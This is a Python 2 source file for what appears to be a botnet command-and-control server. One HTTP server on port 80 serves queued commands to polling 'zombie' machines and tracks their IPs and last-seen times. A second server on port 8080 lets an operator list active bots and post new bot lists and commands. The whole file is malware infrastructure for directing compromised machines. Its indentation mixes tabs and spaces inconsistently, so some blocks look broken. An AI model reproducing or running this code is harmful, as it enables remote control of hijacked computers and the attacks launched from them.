from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import os, threading, socket, json, time
from Queue import Queue
from threading import Thread

class ThreadPoolMixIn(ThreadingMixIn):
    numThreads = 100
    allow_reuse_address = True

    def serve_forever(self):
        self.requests = Queue(self.numThreads)
        for x in range(self.numThreads):
            t = threading.Thread(target=self.process_request_thread)
            t.setDaemon(1)
            t.start()
        while True:
            self.handle_request()
        self.server_close()

    def process_request_thread(self):
        while True:
            ThreadingMixIn.process_request_thread(self, *self.requests.get())

    def handle_request(self):
        try:
            request, client_address = self.get_request()
        except socket.error:
            return
        if self.verify_request(request, client_address):
            self.requests.put((request, client_address))


class ZombieHandler(BaseHTTPRequestHandler):

	def do_GET(self):
        	if self.path.endswith('commands'):
            		try:
                		client_ip = self.client_address[0]
                		with open('commands.txt') as f:
                    			commands = f.readline().strip()
				bots = []
				with open('bots.txt', 'r') as f:
					lines = f.readlines()
				for line in lines:
					bots.append(line.strip())
                		if 'stop' in commands and client_ip in bots:
                    			commands = commands.replace('stop', 'sleep')
                		commands_json = json.loads(commands)
                		data = json.dumps({"commands": commands_json})
                		self.send_response(200)
                		self.end_headers()
                		self.wfile.write(data.encode())
    				zombies = []
       				try:
					with open('zombies.txt', 'r') as f:
						lines = f.readlines()
					for line in lines:
						zombies.append(json.loads(line.strip()))
                			zombies = list([zombie for zombie in zombies if zombie['last_seen'] > time.time() - 30])
                			current_zombies = [zombie['ip'] for zombie in zombies]
                			if client_ip in current_zombies:
                    				ind = current_zombies.index(client_ip)
                    				zombies[ind]['last_seen'] = time.time()
                    				zombies[ind]['command'] = commands_json
                			else:
                    				zombies.append({"ip": client_ip, "command": commands_json, "last_seen": time.time()})
            				with open('zombies.txt', 'w') as f:
                				for zombie in zombies:
                    					f.write(json.dumps(zombie) + '\n')
					
				except Exception as e:
					print(e)
            		except IOError:
                		self.send_error(404, 'File Not Found: %s' % self.path)

class ControlHandler(BaseHTTPRequestHandler):
    
	def do_GET(self):
        	if self.path.endswith('zombies'):
	    		zombies = []
            		try:
				with open('zombies.txt', 'r') as f:
    					lines = f.readlines()
				for line in lines:
					zombies.append(json.loads(line.strip()))
                		data = json.dumps({"zombies": zombies})
                		self.send_response(200)
                		self.end_headers()
                		self.wfile.write(data.encode())
            		except IOError:
                		self.send_error(404, 'File Not Found: %s' % self.path)
		elif self.path == '/':
               		self.send_response(200)
               		self.end_headers()
			

	def do_POST(self):
        	self.send_response(200)
	        self.send_header("Content-type", "text/html")
        	self.end_headers()
	        content_length = int(self.headers['Content-Length'])
        	post_data = self.rfile.read(content_length)
	        data = json.loads(post_data)
		print data
        	if self.path.endswith('bots'):
            		bots = []
		        try:
                		with open('bots.txt', 'w') as f:
                    			bots = data["bots"]
                    			for bot in bots:
                        			f.write(bot + '\n')
            		except IOError:
                		self.send_error(404, 'File Not Found: %s' % self.path)

        	elif self.path.endswith('commands'):
            		try:
                		with open('commands.txt', 'w') as f:
                    			commands = data["commands"]
                        		f.write(json.dumps(commands))
            		except IOError:
                		self.send_error(404, 'File Not Found: %s' % self.path)


class ThreadedHTTPServer(ThreadPoolMixIn, HTTPServer):
    pass


if __name__ == '__main__':
    print ('Starting servers, use <Ctrl-C> to stop')

    zombie_server = ThreadedHTTPServer(('', 80), ZombieHandler)
    control_server = ThreadedHTTPServer(('', 8080), ControlHandler)

    thread_server_zombie = Thread(target=zombie_server.serve_forever)
    thread_server_zombie.setDaemon(1)
    thread_server_zombie.start()

    control_server.serve_forever()
